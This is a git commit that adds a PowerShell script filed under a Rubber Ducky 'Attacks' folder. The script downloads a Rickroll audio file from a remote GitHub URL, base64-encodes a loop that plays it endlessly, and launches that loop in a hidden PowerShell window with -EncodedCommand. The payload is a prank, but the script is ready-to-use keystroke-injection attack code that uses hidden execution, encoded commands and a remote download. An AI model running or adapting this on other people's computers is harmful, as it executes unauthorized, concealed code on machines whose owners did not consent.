5a2fd6f4f1ae9e50d36a2e479620103fb38eaf2c
panik-144 <paul.n.b@outlook.de>
2025-11-24 16:47:53 +0100

    super commit

---
+++ Rubber_Ducky/Attacks/Rickroll/activate.ps1
@@ -0,0 +1,21 @@
+$url = "https://raw.githubusercontent.com/mhoivik/HarmlessMalware/master/rickroll.wav"
+$output = "$env:TEMP\roll.wav"
+
+$code = @"
+    `$url = "$url"
+    `$output = "$output"
+    try {
+        Invoke-WebRequest -Uri `$url -OutFile `$output -ErrorAction Stop
+    } catch {
+        exit
+    }
+    `$player = New-Object System.Media.SoundPlayer `$output
+    while (`$true) {
+        `$player.PlaySync()
+    }
+"@
+
+$bytes = [Text.Encoding]::Unicode.GetBytes($code)
+$encoded = [Convert]::ToBase64String($bytes)
+
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
